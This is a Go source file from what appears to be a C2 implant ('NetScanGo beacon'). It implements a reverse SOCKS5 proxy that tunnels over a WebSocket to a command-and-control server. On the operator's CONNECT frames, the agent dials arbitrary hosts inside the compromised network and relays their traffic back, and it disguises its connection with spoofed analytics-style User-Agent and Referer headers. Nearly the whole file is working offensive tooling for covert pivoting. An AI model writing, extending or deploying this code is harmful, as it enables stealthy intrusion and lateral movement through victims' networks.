// beacon/proxy.go — Reverse SOCKS5 multiplexer for the NetScanGo beacon.
//
// Strict 9-Byte Frame Standard (must stay in sync with socks_bridge.py):
//
//   Layout:
//     Byte  0       : Type     (uint8)
//     Bytes 1 - 4   : StreamID (uint32 big-endian)
//     Bytes 5 - 8   : Length   (uint32 big-endian)
//     Bytes 9+      : Payload  (Length bytes)
//
//   Frame types:                    direction
//     0x01  CONNECT   "host:port"   C2  → Agent  (open new stream)
//     0x02  DATA      raw bytes     bidirectional
//     0x03  CLOSE     (empty)       bidirectional (close a stream)
//     0x04  CONNECTED (empty)       Agent → C2   (dial succeeded)
//     0x05  ERROR     error string  Agent → C2   (dial failed)
//
// When the C2 queues a "start_proxy" task, Run() calls b.RunProxy(wsURL) in a
// goroutine so normal beacon polling continues in parallel.
//
// The Router
// ----------
// RunProxy connects to the C2 WebSocket server and enters a demux loop that
// reads binary frames and dispatches them:
//   CONNECT → net.Dial("tcp", target), store conn in streams map, send CONNECTED
//   DATA    → look up stream in map, write payload to TCP connection
//   CLOSE   → look up stream, close TCP connection, remove from map
//
// The Reverse Path
// ----------------
// For every successful net.Dial, a goroutine reads from the target TCP
// connection, wraps response data in DATA frames (same StreamID), and writes
// them back up to the C2 over the WebSocket.

package main

import (
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ── Frame constants (must mirror socks_bridge.py) ────────────────────────────

const (
	frameConnect   uint8 = 0x01 // C2 → Agent: open new TCP stream
	frameData      uint8 = 0x02 // bidirectional: raw TCP payload
	frameClose     uint8 = 0x03 // bidirectional: close a stream
	frameConnected uint8 = 0x04 // Agent → C2: net.Dial succeeded
	frameError     uint8 = 0x05 // Agent → C2: net.Dial failed

	frameHeaderLen = 9 // 1 (type) + 4 (stream_id) + 4 (length)
)

// ── Frame encode / decode ─────────────────────────────────────────────────────

// encodeFrame packs a complete 9-byte-header binary frame.
//
// Layout produced:
//
//	[type: 1B][stream_id: 4B BE][len(payload): 4B BE][payload: NB]
func encodeFrame(streamID uint32, ftype uint8, payload []byte) []byte {
	buf := make([]byte, frameHeaderLen+len(payload))
	buf[0] = ftype
	binary.BigEndian.PutUint32(buf[1:5], streamID)
	binary.BigEndian.PutUint32(buf[5:9], uint32(len(payload)))
	copy(buf[9:], payload)
	return buf
}

// proxyFrame is the decoded in-memory representation of one frame.
type proxyFrame struct {
	Type     uint8
	StreamID uint32
	Payload  []byte
}

// decodeFrame parses a raw WebSocket binary message into a proxyFrame.
func decodeFrame(raw []byte) (proxyFrame, error) {
	if len(raw) < frameHeaderLen {
		return proxyFrame{}, fmt.Errorf("frame too short (%d bytes)", len(raw))
	}
	ftype      := raw[0]
	streamID   := binary.BigEndian.Uint32(raw[1:5])
	payloadLen := binary.BigEndian.Uint32(raw[5:9])
	end        := frameHeaderLen + int(payloadLen)
	if end > len(raw) {
		return proxyFrame{}, fmt.Errorf(
			"payload_len %d exceeds available %d bytes",
			payloadLen, len(raw)-frameHeaderLen,
		)
	}
	payload := make([]byte, payloadLen)
	copy(payload, raw[frameHeaderLen:end])
	return proxyFrame{Type: ftype, StreamID: streamID, Payload: payload}, nil
}

// ── stream ─────────────────────────────────────────────────────────────────────

// stream represents one proxied TCP connection on the target network.
// All writes to the downstream TCP connection go through the `send` channel
// so handleConnect is the sole writer; close() is idempotent.
type stream struct {
	id   uint32
	conn net.Conn
	send chan []byte // buffered; closed by close()
	once sync.Once
}

func (s *stream) close() {
	s.once.Do(func() {
		s.conn.Close()
		close(s.send)
	})
}

// ── proxySession (goroutine-safe demuxer) ────────────────────────────────────

type proxySession struct {
	ws      *websocket.Conn
	wsMu    sync.Mutex         // serialise WebSocket writes
	mu      sync.Mutex         // guard streams map
	streams map[uint32]*stream  // StreamID → active TCP connection
	log     interface{ Printf(string, ...interface{}) }
}

func newProxySession(
	ws *websocket.Conn,
	log interface{ Printf(string, ...interface{}) },
) *proxySession {
	return &proxySession{
		ws:      ws,
		streams: make(map[uint32]*stream),
		log:     log,
	}
}

// sendFrame writes a binary WebSocket frame; goroutine-safe.
func (s *proxySession) sendFrame(streamID uint32, ftype uint8, payload []byte) error {
	raw := encodeFrame(streamID, ftype, payload)
	s.wsMu.Lock()
	defer s.wsMu.Unlock()
	s.ws.SetWriteDeadline(time.Now().Add(15 * time.Second))
	return s.ws.WriteMessage(websocket.BinaryMessage, raw)
}

// dispatch routes an inbound frame to the correct handler.
func (s *proxySession) dispatch(f proxyFrame) {
	switch f.Type {
	case frameConnect:
		// Step 1 of CONNECT: the C2 wants us to open a new TCP connection.
		// handleConnect runs in its own goroutine so we don't block the reader.
		go s.handleConnect(f)

	case frameData:
		// Forward raw payload to the TCP connection for this stream.
		s.mu.Lock()
		st := s.streams[f.StreamID]
		s.mu.Unlock()
		if st == nil {
			return
		}
		// Non-blocking send to avoid stalling the frame-reader goroutine.
		select {
		case st.send <- f.Payload:
		default:
			s.log.Printf("[proxy] stream %d: send buffer full — dropping %d B",
				f.StreamID, len(f.Payload))
		}

	case frameClose:
		// The C2 is closing this stream.
		s.mu.Lock()
		st := s.streams[f.StreamID]
		s.mu.Unlock()
		if st != nil {
			st.close()
		}
	}
}

// handleConnect dials the target host:port and wires up the data pump.
// Called as a goroutine from dispatch().
//
// Implements the full CONNECT → CONNECTED flow:
//  1. Parse "host:port" from f.Payload.
//  2. net.Dial("tcp", addr) — if it fails, send FRAME_ERROR back to C2.
//  3. Register the stream in the map; send FRAME_CONNECTED to C2.
//  4. Spawn reverse-path goroutine: target TCP → DATA frames → C2.
//  5. Drain the `send` channel: DATA frames from C2 → target TCP.
func (s *proxySession) handleConnect(f proxyFrame) {
	addr := string(f.Payload) // "host:port"
	s.log.Printf("[proxy] stream %d: dialing %s", f.StreamID, addr)

	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		s.log.Printf("[proxy] stream %d: dial error: %v", f.StreamID, err)
		_ = s.sendFrame(f.StreamID, frameError, []byte(err.Error()))
		return
	}

	st := &stream{
		id:   f.StreamID,
		conn: conn,
		send: make(chan []byte, 128), // buffer 128 chunks before back-pressure
	}

	s.mu.Lock()
	s.streams[f.StreamID] = st
	s.mu.Unlock()

	// Notify C2: dial succeeded.
	if err := s.sendFrame(f.StreamID, frameConnected, nil); err != nil {
		s.log.Printf("[proxy] stream %d: CONNECTED frame failed: %v", f.StreamID, err)
		conn.Close()
		return
	}

	// ── Reverse path: target TCP → DATA frames → C2 ──────────────────────
	// This goroutine reads from the remote TCP connection and wraps every
	// chunk into a DATA frame (with the correct StreamID) sent up to C2.
	go func() {
		defer func() {
			s.mu.Lock()
			delete(s.streams, st.id)
			s.mu.Unlock()
			st.close()
			_ = s.sendFrame(st.id, frameClose, nil)
			s.log.Printf("[proxy] stream %d: target closed connection", st.id)
		}()

		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				chunk := make([]byte, n)
				copy(chunk, buf[:n])
				if sendErr := s.sendFrame(st.id, frameData, chunk); sendErr != nil {
					return
				}
			}
			if err != nil {
				if err != io.EOF {
					s.log.Printf("[proxy] stream %d: read error: %v", st.id, err)
				}
				return
			}
		}
	}()

	// ── Forward path: DATA frames from C2 → target TCP ───────────────────
	// Drain the buffered send channel until it is closed (by st.close()).
	for chunk := range st.send {
		if _, err := conn.Write(chunk); err != nil {
			s.log.Printf("[proxy] stream %d: write error: %v", st.id, err)
			break
		}
	}
}

// run reads frames from the WebSocket until the connection closes.
// Blocks until the tunnel is torn down.
func (s *proxySession) run() {
	defer func() {
		// Tear down all open streams on WebSocket close.
		s.mu.Lock()
		for _, st := range s.streams {
			st.close()
		}
		s.mu.Unlock()
	}()

	for {
		// No read deadline — let the WebSocket live as long as the C2 needs.
		_, raw, err := s.ws.ReadMessage()
		if err != nil {
			s.log.Printf("[proxy] WebSocket read error: %v", err)
			return
		}

		f, err := decodeFrame(raw)
		if err != nil {
			s.log.Printf("[proxy] frame decode error: %v", err)
			continue
		}
		s.dispatch(f)
	}
}

// ── RunProxy ──────────────────────────────────────────────────────────────────

// RunProxy connects to the C2 WebSocket tunnel server and runs the demuxer
// until the WebSocket is closed.  Called as a goroutine from Run() so the
// normal beacon polling loop continues in parallel.
func (b *Beacon) RunProxy(wsURL string) {
	b.log.Printf("[proxy] connecting to %s", wsURL)

	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: b.insecure, //nolint:gosec — intentional for lab/self-signed TLS
			MinVersion:         tls.VersionTLS12,
		},
		HandshakeTimeout: 15 * time.Second,
	}

	// Reuse the same spoofed profile headers as the HTTP beacon.
	hdrs := http.Header{}
	hdrs.Set("User-Agent", gaUserAgent)
	hdrs.Set("Referer", gaReferer)

	ws, _, err := dialer.Dial(wsURL, hdrs)
	if err != nil {
		b.log.Printf("[proxy] WebSocket dial failed: %v", err)
		return
	}
	defer ws.Close()

	b.log.Printf("[proxy] WebSocket tunnel established — demux loop running")
	session := newProxySession(ws, b.log)
	session.run()
	b.log.Printf("[proxy] WebSocket tunnel closed")
}
